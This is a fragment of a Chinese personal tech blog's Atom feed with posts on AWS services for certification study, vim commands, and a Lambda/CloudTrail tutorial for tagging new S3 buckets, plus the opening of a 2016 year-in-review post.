+<h3 id="Storage-Gateway"><a href="#Storage-Gateway" class="headerlink" title="Storage Gateway"></a>Storage Gateway</h3><p><a href="https://aws.amazon.com/storagegateway/" target="_blank" rel="external">Storage Gateway</a>是一个让你的数据中心可以和AWS存储设备无缝对接的服务，你可以像访问本地文件系统一样访问你存储在AWS云上的资源。</p>
+<blockquote>
+<p>注：该服务在Ops认证会被重点考察，SAA涉及不多。</p>
+</blockquote>
+<h2 id="Databases"><a href="#Databases" class="headerlink" title="Databases"></a>Databases</h2><p><a href="https://aws.amazon.com/products/databases" target="_blank" rel="external">AWS Cloud Database</a>提供了一系列由AWS帮你管理的数据库服务。<br>涉及到考试，重点在针对不同的使用场景选择合适的数据库服务，另外非关系型数据库的高性能高伸缩和关系型数据库如何做到高可用，读写分离也常会作为考点。</p>
+<h3 id="RDS"><a href="#RDS" class="headerlink" title="RDS"></a>RDS</h3><p>RDS(<a href="https://aws.amazon.com/rds/" target="_blank" rel="external">Relation Database Serveice</a>)是一个托管在AWS上的关系型数据库，目前支持MySQL，Postgresql，SQLserver，MariaDB，Oracle和一个亚马逊自己出的Aurora（据说很屌）。</p>
+<h3 id="DynamoDB"><a href="#DynamoDB" class="headerlink" title="DynamoDB"></a>DynamoDB</h3><p><a href="https://aws.amazon.com/dynamodb/" target="_blank" rel="external">DynamoDB</a>是AWS提供的非关系型数据库，特点是高一致，低延迟，极易伸缩，相当灵活。</p>
+<blockquote>
+<p>注：该服务在Developor认证考试中重点考察，SAA认证也有涉及。</p>
+</blockquote>
+<h3 id="Redshift"><a href="#Redshift" class="headerlink" title="Redshift"></a>Redshift</h3><p><a href="https://aws.amazon.com/redshift/" target="_blank" rel="external">Redshift</a>是托管在AWS上的数据仓库，提供PB级的存储服务。</p>
+<h3 id="Elasticache"><a href="#Elasticache" class="headerlink" title="Elasticache"></a>Elasticache</h3><p><a href="https://aws.amazon.com/elasticache/" target="_blank" rel="external">Elasticache</a>AWS上一个高吞吐的缓存服务，有Redis和Memcached两种类型。</p>
+<h2 id="Migration"><a href="#Migration" class="headerlink" title="Migration"></a>Migration</h2><h3 id="Snowball"><a href="#Snowball" class="headerlink" title="Snowball"></a>Snowball</h3><p>AWS官方提供的物理迁移，小型的是一个手提箱，大型的有卡车大小的移动存储，帮助你将大量数据加密传输到亚马逊的云上。<br>关于Snowball一个重要的概念就是Import和Export，你可以从S3导出或导入数据到Snowball。</p>
+<h3 id="DMS"><a href="#DMS" class="headerlink" title="DMS"></a>DMS</h3><p>DMS(<a href="https://aws.amazon.com/dms/" target="_blank" rel="external">Database Migration Service</a>)帮助你将本地数据库中的数据迁移到AWS上，同时还支持在AWS中不同类型的数据库之间做零宕机的数据迁移。比如从本地的Oracle中将数据迁移到AWS的Aurora上。</p>
+<blockquote>
+<p>注：DMS是AWS中一个重要的服务，但暂未出现在SAA的考试中。</p>
+</blockquote>
+<h3 id="SMS"><a href="#SMS" class="headerlink" title="SMS"></a>SMS</h3><p>SMS(<a href="https://aws.amazon.com/server-migration-service/" target="_blank" rel="external">Server Migration Service</a>)AWS服务器迁移服务是一种无代理服务，使租户能够快速将本地服务增量式地迁移到云上，具体就是将本地服务器的卷打成镜像放到云上再跑起来。</p>
+<blockquote>
+<p>注：该服务暂时没有在所有考试中出现。</p>
+</blockquote>
+<h2 id="Analytics"><a href="#Analytics" class="headerlink" title="Analytics"></a>Analytics</h2><p><a href="https://aws.amazon.com/products/analytics/" target="_blank" rel="external">Analytics</a>主要用于处理，分析，可视化数据。</p>
+<h3 id="Athena"><a href="#Athena" class="headerlink" title="Athena"></a>Athena</h3><p><a href="https://aws.amazon.com/athena/" target="_blank" rel="external">Athena</a>让租户可以使用SQL交互式地查询S3中的数据，Athena是Serverless的，所以用户只需按使用次数付费。</p>
+<h3 id="EMR"><a href="#EMR" class="headerlink" title="EMR"></a>EMR</h3><p>Elastic MapReduce，就是托管在AWS上的map reduce，用于管理大数据集群（EC2 instance集群）</p>
+<blockquote>
+<p>注：SAA考试会涉及。</p>
+</blockquote>
+<h3 id="Cloud-Search-amp-Elastic-Search"><a href="#Cloud-Search-amp-Elastic-Search" class="headerlink" title="Cloud Search &amp; Elastic Search"></a>Cloud Search &amp; Elastic Search</h3><p>用于构建站内搜索或应用内搜索。</p>
+<blockquote>
+<p>注：助理级考试均不涉及。</p>
+</blockquote>
+<h3 id="Kinesis"><a href="#Kinesis" class="headerlink" title="Kinesis"></a>Kinesis</h3><p><a href="https://aws.amazon.com/kinesis/" target="_blank" rel="external">Kinesis</a>强大的实时数据流处理服务，速度可达TB每小时，用于上传，分析实时数据流。比较重要。</p>
+<h3 id="Data-Pipeline"><a href="#Data-Pipeline" class="headerlink" title="Data Pipeline"></a>Data Pipeline</h3><p>提供有序处理数据，洗数据，数据迁移的工作。</p>
+<h3 id="Quick-Sight"><a href="#Quick-Sight" class="headerlink" title="Quick Sight"></a>Quick Sight</h3><p>为你的数据创建可视化面板。</p>
+<h2 id="Security-amp-Identity"><a href="#Security-amp-Identity" class="headerlink" title="Security &amp; Identity"></a>Security &amp; Identity</h2><h3 id="IAM"><a href="#IAM" class="headerlink" title="IAM"></a>IAM</h3><p>IAM(<a href="https://aws.amazon.com/iam/" target="_blank" rel="external">Identity &amp; Access Management</a>)是AWS的权限管理服务，是一个非常重要的服务。这个服务是免费的，而且Global，即不收Region限制的。<br>关于IAM主要需要知道关于User Group, User, Role, Polic几个概念即可；User Group和User都类似于Linux中的用户组和用户的概念，不同的是AWS根据Polic赋予用户权限，关于Polic，主要就是规定可以对“何种资源”进行“何种操作”两个参数，Role的定义类似于User，但是Role不是赋予用户使用，而是赋予给AWS的资源的，例如租户需要创建一个EC2 instance，这个Instance需要操纵S3的资源，那么你需要在创建这个EC2 instance的时候赋予一个带S3操作权限的Role，需要注意的是Role只能在创建资源的时候被赋予，且不能更改不能解除绑定，另外在包含Role的instance中你无法看到AWS ACCESS KEY 之类的文本文件，这是AWS出于安全的设计。</p>
+<h3 id="Inspector"><a href="#Inspector" class="headerlink" title="Inspector"></a>Inspector</h3><p><a href="https://aws.amazon.com/inspector/" target="_blank" rel="external">Inspector</a>是一个安装在EC2 instance上的客户端，用于生成安全报告。</p>
+<blockquote>
+<p>注：暂不在考试中出现</p>
+</blockquote>
+<h3 id="Certificate-Manager"><a href="#Certificate-Manager" class="headerlink" title="Certificate Manager"></a>Certificate Manager</h3><p><a href="https://aws.amazon.com/certificate-manager/" target="_blank" rel="external">Certificate Manager</a>是一个用于管理SSL证书的服务。</p>
+<h3 id="Directory-Service"><a href="#Directory-Service" class="headerlink" title="Directory Service"></a>Directory Service</h3><p><a href="https://aws.amazon.com/directoryservice/" target="_blank" rel="external">Directory Service</a>让租户可以将AWS权限管理和自建数据中的AD group集合在一起，可以直接使用Microsoft AD Group创建AWS中的资源。</p>
+<h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p>WAF(<a href="https://aws.amazon.com/certificate-manager.com/waf/" target="_blank" rel="external">Web Application Firewall</a>)给予租户应用级别的安全防护，比如SQL注入，跨站攻击，等。</p>
+<h3 id="Artifact"><a href="#Artifact" class="headerlink" title="Artifact"></a>Artifact</h3><p>这是让你能访问到AWS compliance document 的服务，可以从中获取各种合规文件。</p>
+<h2 id="Management-Tools"><a href="#Management-Tools" class="headerlink" title="Management Tools"></a>Management Tools</h2><h3 id="Could-Watch"><a href="#Could-Watch" class="headerlink" title="Could Watch"></a>Could Watch</h3><p>Cloud Watch 是AWS重要的Ops工具，作用为监控AWS资源状态的工具，可以设置连个级别，分别是五分钟一个心跳（默认）和一分钟一个心跳。该服务监控类目(Metrics)繁多，甚至包括花费的监控预警，可以设置Alarm触发SNS给到租户通知实现报警的功能。</p>
+<h3 id="Cloud-Formation"><a href="#Cloud-Formation" class="headerlink" title="Cloud Formation"></a>Cloud Formation</h3><p>Cloud Formation是AWS一个重要的DevOps工具，实践了基础设施及代码，租户可以使用一套模板（Template），即一个Json或者Yaml的文件定义整个AWS服务的使用，包括资源，网络，权限。是一个可以投入大量精力使用学习的一个服务。</p>
+<blockquote>
+<p>注：Cloud Formation是一个重要的服务，但不会在SAA考试中出现很多，只需要一定程度的了解即可，但想成为一个真正的架构师，这个服务必须要熟悉。</p>
+</blockquote>
+<h3 id="Cloud-Trail"><a href="#Cloud-Trail" class="headerlink" title="Cloud Trail"></a>Cloud Trail</h3><p>用于监控AWS API调用的一个服务，哪些操作属于AWS API调用——创建一个资源，改变一个资源的配置，销毁一个资源，往S3上传一个对象，都算。这些操作被Cloud Trail记录下来保存在S3中作为log供租户使用，AWS的一些边缘服务也有依赖于Cloud Trail的。但笔者在使用该服务时发现其存在延迟时间长（10-20min），无法划分日志级别，且日志冗余不易分析等缺点，仍不是很好用。</p>
+<h3 id="Opsworks"><a href="#Opsworks" class="headerlink" title="Opsworks"></a>Opsworks</h3><p>AWS提供的有一个基础设施及代码的工具，使用<a href="https://www.chef.io/chef/" target="_blank" rel="external">Chef</a>。</p>
+<h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><p><a href="https://aws.amazon.com/waf/" target="_blank" rel="external">Config</a>是用于记录资源配置规则变更，并判断资源配置是否合规的一个服务。</p>
+<blockquote>
+<p>注：该服务不会出现在助理级考试中，但会在Security的考察中出现。</p>
+</blockquote>
+<h3 id="Service-Catalog-amp-Trusted-Advisor"><a href="#Service-Catalog-amp-Trusted-Advisor" class="headerlink" title="Service Catalog &amp; Trusted Advisor"></a>Service Catalog &amp; Trusted Advisor</h3><p>Trusted Advisor是一个有意思的服务，从安全，省钱，性能，容错四个角度给你的AWS资源配给一个全面的分析，这四个角度也是AWS架构师设计一个良好的架构必须要考虑的四个角度。且该服务与AWS收费等级强相关，AWS的服务等级分为基础版、开发版、商业版、企业版四个级别，交的钱不同会高度体现在这个服务的内容上。<a href="https://aws.amazon.com/premiumsupport/compare-plans/" target="_blank" rel="external">https://aws.amazon.com/premiumsupport/compare-plans/</a></p>
+<h2 id="Application-Services"><a href="#Application-Services" class="headerlink" title="Application Services"></a>Application Services</h2><h3 id="Step-Functions"><a href="#Step-Functions" class="headerlink" title="Step Functions"></a>Step Functions</h3><p><a href="https://aws.amazon.com/step-functions/" target="_blank" rel="external">Step Functions</a>是在2017年初才推出的一个新服务，可用于执行批处理脚本。</p>
+<blockquote>
+<p>注：因为该服务还很新，暂未出现在认证考试中</p>
+</blockquote>
+<h3 id="SWF"><a href="#SWF" class="headerlink" title="SWF"></a>SWF</h3><p>SWF(<a href="https://aws.amazon.com/swf/" target="_blank" rel="external">Simple Workflow Service</a>)让开发者可以按顺序执行一些后台命令，如果您的应用程序的步骤需要超过500毫秒的时间来完成，您需要跟踪处理状态，如果任务失败，您需要恢复或重试，Amazon SWF可以做到。</p>
+<blockquote>
+<p>注：这个服务比较重要，需要动手实践。</p>
+</blockquote>
+<h3 id="API-Gateway"><a href="#API-Gateway" class="headerlink" title="API Gateway"></a>API Gateway</h3><p>API Gateway是AWS一个Serverless有关的重要的服务，常用于触发Lambda function。</p>
+<blockquote>
+<p>注：这个服务在构建无服务架构的时候非常重要，但不会在考试中涉及很多细节，只需要了解其作用，用法即可。</p>
+</blockquote>
+<h3 id="Elasic-Transcoder"><a href="#Elasic-Transcoder" class="headerlink" title="Elasic Transcoder"></a>Elasic Transcoder</h3><p>用于视频转码。</p>
+<h2 id="Message"><a href="#Message" class="headerlink" title="Message"></a>Message</h2><p>消息服务是AWS一个非常重要的服务，我们可以通过SNS(Simple Noticfication Service)发送短信，邮件提示，使用SQS（Simple Queue Service）构建一个保证交付的消息队列，使用SES(Simple Email Service)收发邮件。</p>
+<h2 id="Desktop-amp-App-Streaming"><a href="#Desktop-amp-App-Streaming" class="headerlink" title="Desktop &amp; App Streaming"></a>Desktop &amp; App Streaming</h2><h3 id="workspace"><a href="#workspace" class="headerlink" title="workspace"></a>workspace</h3><p>一个在AWS云端的远程办公桌面。</p>
+<h3 id="AppStream2-0"><a href="#AppStream2-0" class="headerlink" title="AppStream2.0"></a>AppStream2.0</h3><p><a href="https://aws.amazon.com/appstream2/" target="_blank" rel="external">AppStream</a>可以将桌面应用程序流式传输到运行Web浏览器的任何设备，安全地从任何地方即时访问桌面应用程序，如AWS console。</p>
+<blockquote>
+<ul>
+<li>参考资料</li>
+<li><a href="https://www.linuxnix.com/amazon-aws-regions-vs-availability-zones-vs-edge-locations-vs-data-centers/" target="_blank" rel="external">https://www.linuxnix.com/amazon-aws-regions-vs-availability-zones-vs-edge-locations-vs-data-centers/</a></li>
+</ul>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;Amazon-Web-Server-服务概览&quot;&gt;&lt;a href=&quot;#Amazon-Web-Server-服务概览&quot; class=&quot;headerlink&quot; title=&quot;Amazon Web Server 服务概览&quot;&gt;&lt;/a&gt;Amazon Web Server 服务
+    
+    </summary>
+    
+    
+      <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
+    
+      <category term="云计算" scheme="https://www.duyidong.com/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>vim学习小计</title>
+    <link href="https://www.duyidong.com/2017/02/24/vim%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%A1/"/>
+    <id>https://www.duyidong.com/2017/02/24/vim学习小计/</id>
+    <published>2017-02-24T07:41:09.000Z</published>
+    <updated>2017-03-07T10:12:23.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="vim常用命令"><a href="#vim常用命令" class="headerlink" title="vim常用命令"></a>vim常用命令</h1><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>说起来，从接触Linux到现在，使用Vim大概有一年的时间，大部分时候主要在编辑一些配置文件，查看文档使用。算不上vim的高级玩家，在此主要针对vim的一些常见使用场景做一个命令汇总。</p>
+<h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><pre><code>vim -On file1 file2 # 左右打开两个文件
+vim -on file1 file2 # 上下打开两个文件
+vim -d file1 file2 # diff
+</code></pre><h2 id="编辑常用"><a href="#编辑常用" class="headerlink" title="编辑常用"></a>编辑常用</h2><pre><code>数字+hjkl 上下左右
+^ $ 跳转到行首行位
+gg G 首行 尾行
+aAoO 插入在前后上下
+数字+yy 数字+pp 复制粘贴
+</code></pre><p>通过<code>c-f</code>向下翻页，<code>c-b</code>向上翻页；<code>c-e</code>逐行下滚，<code>c-y</code>逐行上滚。这在几乎所有Unix软件中都是好使的，比如man和less。 <code>H</code>可以移动到屏幕的首行，<code>L</code>到屏幕尾行，<code>M</code>到屏幕中间。</p>
+<p><code>zt</code>可以置顶当前行，通常用来查看完整的下文，比如函数、类的定义。 <code>zz</code>将当前行移到屏幕中部，<code>zb</code>移到底部。</p>
+<h2 id="多行编辑"><a href="#多行编辑" class="headerlink" title="多行编辑"></a>多行编辑</h2><p>最常用的编辑即为块注释和块取消注释:</p>
+<pre><code>c-v 向下选中要被注释的行 # 选中模式
+I # insert，在首行插入注释符
+Esc # 推出即将首行更改应用到选中行
+</code></pre><p>取消块注释差不多，选中之后<code>x</code>即可</p>
+<h2 id="多窗口编辑"><a href="#多窗口编辑" class="headerlink" title="多窗口编辑"></a>多窗口编辑</h2><pre><code>:split file 横屏打开一个文件
+:vsplit file 竖屏打开一个文件
+c-w hjkl 上下左右切换活动窗口
+c-w w 顺序切换
+c-w HJKL 上下左右移动窗口
+</code></pre><p>vim有多标签功能Tag，但我觉得用得很少，在此不表<br>另外用得比较多的，前后台切换（这个其实是Linux的用法）：</p>
+<pre><code>切换到后台: c-z
+切换到前台： fg 回车
+</code></pre><h2 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h2><pre><code>ZZ 保存退出
+ZQ 不保存退出
+</code></pre><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>显示行号： <code>:set nu</code><br>设置编码： <code>:set encoding:utf-8</code><br>美化json: <code>:%!python -m json.tool</code><br>全局替换:  <code>:%s/被替换的/替换后的/g</code><br>解决粘贴时跳行问题: <code>:set paste</code></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;vim常用命令&quot;&gt;&lt;a href=&quot;#vim常用命令&quot; class=&quot;headerlink&quot; title=&quot;vim常用命令&quot;&gt;&lt;/a&gt;vim常用命令&lt;/h1&gt;&lt;h2 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; titl
+    
+    </summary>
+    
+    
+      <category term="vim" scheme="https://www.duyidong.com/tags/vim/"/>
+    
+      <category term="工具" scheme="https://www.duyidong.com/tags/%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Lambda初体验</title>
+    <link href="https://www.duyidong.com/2017/02/23/Lambda%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
+    <id>https://www.duyidong.com/2017/02/23/Lambda初体验/</id>
+    <published>2017-02-23T10:23:00.000Z</published>
+    <updated>2017-04-12T13:27:48.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="使用Lambda和CloudTrail给新创建的bucket打上tag"><a href="#使用Lambda和CloudTrail给新创建的bucket打上tag" class="headerlink" title="使用Lambda和CloudTrail给新创建的bucket打上tag"></a>使用Lambda和CloudTrail给新创建的bucket打上tag</h1><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><h3 id="什么是Lambda"><a href="#什么是Lambda" class="headerlink" title="什么是Lambda"></a>什么是Lambda</h3><p>AWS Lambda提供了一个不需要服务器就能运行代码的平台，有以下特点：</p>
+<ul>
+<li>高伸缩：适用于一天数次的访问频率到一秒数千次的访问量，横向纵向灵活扩展</li>
+<li>按需付费：你只需要根据访问量付费，价格非常便宜（$0.20每百万次访问）</li>
+<li>高可用：AWS负责维护代码运行的环境，使用者无需操心底层资源的配置，性能，维护</li>
+<li>支持语言：目前官方支持NodeJS, java, C#, Python, 有第三方工具可以支持多种语言</li>
+<li>事件响应：Function是Lambda的计算单元，可以由各种事件触发，这个事件可以是由AWS内部的资源发出的，也可以来自AWS外部。（比如往S3存放一个文件，或者一个HTTP请求）</li>
+</ul>
+<p>使用场景：</p>
+<ul>
+<li>构建一个数据触发的程序用于处理数据，处理Amazon Kinesis中存储的流数据</li>
+<li>构建一个微服务后端的一个模块，配合API Gateway用于响应HTTP事件</li>
+</ul>
+<h3 id="什么是CloudTrail"><a href="#什么是CloudTrail" class="headerlink" title="什么是CloudTrail"></a>什么是CloudTrail</h3><p>用于记录和追踪AWS内部的各种API调用，你可以在CloudTrail的日志中找到所有该账户在AWS中操作资源的事件，包括Console操作，SDK，AWS CLI，以及跟高级服务的调用。</p>
+<p>你可以在事件中找到资源调用者的用户信息，源IP，以及调用时间。</p>
+<h3 id="使用Lambda和CloudTrail实现创建一个S3-bucket自动打上创建者的tag"><a href="#使用Lambda和CloudTrail实现创建一个S3-bucket自动打上创建者的tag" class="headerlink" title="使用Lambda和CloudTrail实现创建一个S3 bucket自动打上创建者的tag"></a>使用Lambda和CloudTrail实现创建一个S3 bucket自动打上创建者的tag</h3><p>CouldTrail 会把所有监控到的API调用的时间写到S3 bucket里的日志文件中，同时产生一个event时间，我们要做的就是用这个event事件触发一个Lambda function，调用AWS的SDK获取API调用日志，当发现日志里出现了CreateBucket事件的时候，给这个bucket打上形如“Owner:dyd”的tag。</p>
+<p><img src="https://docs.aws.amazon.com/lambda/latest/dg/images/wt-cloudtrail-100.png" alt=""></p>
+<p>非常类似于这个功能不过最后吧SNS换成了打tag。</p>
+<ul>
+<li>AWS CloudTrail把日志保存在S3中</li>
+<li>S3 发出一个<code>s3:ObjectCreated:*</code>的事件触发了Lambda function，这个配置在Lambda中实现</li>
+<li>Lambda使用你创建function时赋予的role来执行function</li>
+<li>Lambda获取S3的事件作为一个参数，确定CloudTrail的日志存放在S3中的位置，进而读取日志，当日志中出现eventName=CreateBucket的事件的时候，获取该事件对应的BucketName和UserName，调用AWS S3 SDK</li>
+<li>使用S3 SDK给对应的bucket打上包含UserName的tag</li>
+</ul>
+<h2 id="Step-by-Step"><a href="#Step-by-Step" class="headerlink" title="Step by Step"></a>Step by Step</h2><h3 id="第一步，创建一个Trail"><a href="#第一步，创建一个Trail" class="headerlink" title="第一步，创建一个Trail"></a>第一步，创建一个Trail</h3><p>首先你得有一个AWS账号，选择一个Region，进入CloudTrail的界面。<br>选择左侧<strong>Trail -&gt; Add new Tail</strong>，填写如下信息</p>
+<blockquote>
+<p>Trail Name: Trail的名字，只需要不于同Region的CloudTrail重名即可<br>Apply trail to all regions: 是否需要在所有Region都使用这个CloudTrail，否则只监听CloudTrail所在Region的API调用事件。<br>S3 bucket: 用于存放CloudTrail日志</p>
+</blockquote>
+<p>填选好后点选<strong>Create</strong></p>
+<p><img src="/images/Create_CloudTrail.png" alt=""></p>
+<p>点击新创建的Trail你可以进行配置，确认右上角log为打开状态。<br>过一会儿你就可以在API activity history里看到如下所示的一些event事件了，主要包含事件触发的用户名，时间名称，类型，资源名称。</p>
+<p><img src="/images/CloudTrail_events.png" alt=""></p>
+<h3 id="第二步：为Lmabda-function创建一个role"><a href="#第二步：为Lmabda-function创建一个role" class="headerlink" title="第二步：为Lmabda function创建一个role"></a>第二步：为Lmabda function创建一个role</h3><p>进入 <strong>IAM -&gt; Roles</strong>， 点击 <strong>Create New Role</strong>，输入Role的名字，点选下一步：<br>选择 <strong>AWS Lambda</strong>，下一步：绑定一个Polly<br>这里因为我们除了读取S3的object还需要给S3的bucket打tag的权限，所以方便起见选择<code>AmazonS3FullAccess</code>，另外这个Role需要执行Lambda的权限，所以还需要选择<code>AWSLambdaFullAccess</code>，最后，<strong>确认 -&gt; 创建</strong></p>
+<p><img src="/images/Create_Lambda_Role.png" alt=""></p>
+<h3 id="第三步：创建Lambda-function"><a href="#第三步：创建Lambda-function" class="headerlink" title="第三步：创建Lambda function"></a>第三步：创建Lambda function</h3><p>进入<strong>Lambda</strong>的界面点选<strong>Create a Lambda function</strong><br>在Select blueprint的页面选择python2.7的运行环境，选择s3-get-object-python作为预配置</p>
+<p><img src="/images/Create_Lambda_Select_Blueprint.png" alt=""></p>
+<p>Configure Triggers 页面选择存放CouldTrail日志的S3 Bucket, 事件类型选 Object Created，勾选上Enable Trigger。</p>
+<p><img src="/images/Create_Lambda_Configure_Triggers.png" alt=""></p>
+<p>点击<strong>Next</strong>，输入Name，选择Role Name为上一步创建的Role，其他保持默认，<strong>Next -&gt; 确认配置 -&gt; Create function </strong></p>
+<p><img src="/images/Create_Lambda_Review.png" alt=""></p>
+<p>这里关于Lambda的部署方式，在生产中一般使用打包上传的方式，这里我们的案例比较简单，就直接在consloe上编辑了。</p>
+<h3 id="第四步：-获取测试数据"><a href="#第四步：-获取测试数据" class="headerlink" title="第四步： 获取测试数据"></a>第四步： 获取测试数据</h3><p>首先你需要测试你的Function能够被正常Trigger并拿到测试数据，所以你需要取消注释掉lambda_hander里面的第一行：</p>
+<pre><code class="python">print(&quot;Received event: &quot; + json.dumps(event, indent=2))
+</code></pre>
+<p>余下的不用管，点击<strong>test</strong>，你可以在Log output中看到你的测试内容，即event事件，即可。</p>
+<p>接下来你需要取得一份样本数据用于测试，最简单的方法就是创建一个S3 bucket，<strong>这里一定要注意，创建的bucket需要和CloudTrail在同一个Region，否则事件是无法被捕获的。</strong><br>进入<strong>S3 -&gt; Create bucket</strong> 快速创建一个Bucket:</p>
+<p><img src="/images/Create_S3_Bucket.png" alt=""></p>
+<p>稍等数分钟，这里会有十几分钟的延迟，在Cloudwatch中查看Lambda打印的log：<br>进入<strong>Cloudwatch -&gt; Logs -&gt; 对应Lambda名称的Log Group -&gt; 找到时间点对应的Log Stream</strong>，filter你的bucket名字你会发现一条这样的Log:</p>
+<pre><code class="json">{
+  &quot;Records&quot;: [
+    {
+      &quot;eventVersion&quot;: &quot;2.0&quot;,
+      &quot;eventTime&quot;: &quot;2017-02-23T13:42:18.654Z&quot;,
+      &quot;requestParameters&quot;: {
+        &quot;sourceIPAddress&quot;: &quot;54.224.144.182&quot;
+      },
+      &quot;s3&quot;: {
+        &quot;configurationId&quot;: &quot;fa401b72-97f2-48e8-9b74-b8d2a726a771&quot;,
+        &quot;object&quot;: {
+          &quot;eTag&quot;: &quot;25c76ac2f0284796baacebca934c3875&quot;,
+          &quot;sequencer&quot;: &quot;0058AEE6BA925A5848&quot;,
+          &quot;key&quot;: &quot;AWSLogs/994910148131/CloudTrail/us-east-1/2017/02/23/994910148131_CloudTrail_us-east-1_20170223T1340Z_nIJHY6wtS6EQRUtz.json.gz&quot;,
+          &quot;size&quot;: 17181
+        },
+        &quot;bucket&quot;: {
+          &quot;arn&quot;: &quot;arn:aws:s3:::yidongtrail&quot;,
+          &quot;name&quot;: &quot;yidongtrail&quot;,
+          &quot;ownerIdentity&quot;: {
+            &quot;principalId&quot;: &quot;A1EKSBYVFNIFR0&quot;
+          }
+        },
+        &quot;s3SchemaVersion&quot;: &quot;1.0&quot;
+      },
+      &quot;responseElements&quot;: {
+        &quot;x-amz-id-2&quot;: &quot;jN1tHU9s2/Y1RvA31IG34MhbHiAtB/45v938qdzsff2ufgZ8v5osNCcPKNWVrlnuh4qTs/J0odg=&quot;,
+        &quot;x-amz-request-id&quot;: &quot;57FBF80C150FB0CE&quot;
+      },
+      &quot;awsRegion&quot;: &quot;us-east-1&quot;,
+      &quot;eventName&quot;: &quot;ObjectCreated:Put&quot;,
+      &quot;userIdentity&quot;: {
+        &quot;principalId&quot;: &quot;AWS:AROAI6ZMWVXR3IZ6MKNSW:i-012030f0061c32dcd&quot;
+      },
+      &quot;eventSource&quot;: &quot;aws:s3&quot;
+    }
+  ]
+}
+</code></pre>
+<p>这就是我们要的测试数据</p>
+<h3 id="编写Function函数"><a href="#编写Function函数" class="headerlink" title="编写Function函数"></a>编写Function函数</h3><p>把上一步得到的json文件放到Lambda的“单元测试”（我是这么理解的）里：<br><strong>选中你的Function -&gt; Actions -&gt; Configure test event</strong>，直接把这个json粘贴进去。</p>
+<p>下面你可以一边写代码一边运行测试。<br>我得说AWS console的这个工具确实不太好用，推荐自行谷歌好用的第三方工具做这个事。我是在本地进行测试和断点调试的。<br>写好的代码在这里，可以作为参考：<a href="https://github.com/ADU-21/test_lambda/blob/master/lambda.py" target="_blank" rel="external">https://github.com/ADU-21/test_lambda/blob/master/lambda.py</a></p>
+<p>保存测试通过之后，你可以再尝试创建一个bucket，这个bucket在创建完成后十几分钟会被自动打上一个tag.</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Tag作为AWS官方推荐的管理资源计费的方式却并没有提供相应的接口给每个用户创建的资源打上自己的tag，我做这个实验的初衷原本是想通过这种方式给所有的AWS资源都打上tag，但是在操作过程中发现CloudTrail的日志并没有想象中那么容易过滤出有用信息，比如Create Instance这个动作并不会只有一个CreateInstance的event时间被产生，而是会在长达数十分钟的时间里产生多个RunInsatance的事件，时间延迟也是一个不小的问题，关于资源管理，还需要探索更好的方案。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;使用Lambda和CloudTrail给新创建的bucket打上tag&quot;&gt;&lt;a href=&quot;#使用Lambda和CloudTrail给新创建的bucket打上tag&quot; class=&quot;headerlink&quot; title=&quot;使用Lambda和CloudTrail给新创
+    
+    </summary>
+    
+    
+      <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
+    
+      <category term="Serverless" scheme="https://www.duyidong.com/tags/Serverless/"/>
+    
+      <category term="无服务器架构" scheme="https://www.duyidong.com/tags/%E6%97%A0%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84/"/>
+    
+      <category term="上云" scheme="https://www.duyidong.com/tags/%E4%B8%8A%E4%BA%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2016大事记</title>
+    <link href="https://www.duyidong.com/2017/01/16/2016%E5%A4%A7%E4%BA%8B%E8%AE%B0/"/>
+    <id>https://www.duyidong.com/2017/01/16/2016大事记/</id>
+    <published>2017-01-16T08:35:41.000Z</published>
+    <updated>2017-02-20T12:39:03.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="2016-野蛮生长的一年"><a href="#2016-野蛮生长的一年" class="headerlink" title="2016 野蛮生长的一年"></a>2016 野蛮生长的一年</h1><h2 id="15年的尾声"><a href="#15年的尾声" class="headerlink" title="15年的尾声"></a>15年的尾声</h2><p>15年经历了北京的痛不欲生回到成都，辗转踌躇，终于找到一份工作进入IT行业，算起来迄今不过只度过了短短一年，比起影视行业摸爬滚打的2年时光，还要短些，我已俨然一副程序员模样，享受着室内舒适的工作环境，稳定的收入，付出着擅长的脑力劳动，有时候会想，不是我选择了工作，是工作选择了我；有时候也会想，会不会有一天，我又不做程序员了，什么会让我生存下去？<br><a id="more"></a></p>
